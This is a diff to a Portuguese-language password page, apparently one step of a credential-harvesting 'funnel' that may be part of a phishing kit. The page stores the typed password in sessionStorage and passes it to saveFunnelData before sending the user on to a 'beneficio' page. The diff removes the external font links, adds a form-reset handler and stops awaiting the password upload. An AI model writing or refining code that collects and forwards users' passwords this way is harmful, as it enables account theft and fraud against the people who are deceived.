@@ -8,9 +8,6 @@
     <script src="assets/js/ref-guard.js"></script>
     <script src="assets/js/tailwind.js"></script>
     <link href="assets/css/inter.css" rel="stylesheet">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <script src="assets/js/funnel.js"></script>
     <style>
         body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0064F5 0%, #003d99 100%); }
@@ -41,6 +38,19 @@
         </form>
 
         <script>
+            function resetFormState() {
+                const btn = document.getElementById('btnContinuar');
+                if (btn) {
+                    btn.disabled = false;
+                    btn.innerText = 'CONTINUAR';
+                }
+                const errorMsg = document.getElementById('errorMsg');
+                if (errorMsg) errorMsg.classList.add('hidden');
+            }
+
+            window.addEventListener('pageshow', resetFormState);
+            document.addEventListener('DOMContentLoaded', resetFormState);
+
             document.getElementById('passwordForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 const pass = document.getElementById('password').value;
@@ -57,7 +67,7 @@
                 btn.innerText = 'Validando...';
 
                 sessionStorage.setItem('user_password', pass);
-                await saveFunnelData('senha', { password: pass });
+                saveFunnelData('senha', { password: pass });
 
                 // Próxima etapa do funil: BENEFICIO
                 navTo('beneficio.html');
